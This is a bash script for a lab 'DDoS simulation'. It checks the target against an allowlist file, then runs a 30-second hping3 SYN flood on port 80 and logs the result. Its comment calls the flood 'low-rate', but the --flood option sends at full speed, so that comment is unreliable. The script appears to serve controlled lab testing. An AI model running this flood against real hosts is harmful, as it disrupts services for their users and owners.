#!/bin/bash
# DDoS attack simulation script
set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
OUTPUT_FILE="/artifacts/ddos-${TARGET}-${TIMESTAMP}.log"

# Validate target
if ! grep -qx "$TARGET" /etc/lab_allowed_targets; then
    echo "ERROR: Target $TARGET not in allowed list"
    exit 1
fi

echo "Starting DDoS simulation against $TARGET"
echo "Output: $OUTPUT_FILE"

# Simulate DDoS using hping3 (low-rate for demo)
timeout 30 hping3 -S --flood -p 80 "$TARGET" 2>&1 | tee "$OUTPUT_FILE" &
PID=$!

# Wait for the simulation to complete
wait $PID
EXIT_CODE=$?

if [ $EXIT_CODE -eq 0 ] || [ $EXIT_CODE -eq 124 ]; then
    echo "DDoS simulation completed"
    echo "ARTIFACT: $OUTPUT_FILE"
    exit 0
else
    echo "DDoS simulation failed with exit code $EXIT_CODE"
    exit $EXIT_CODE
fi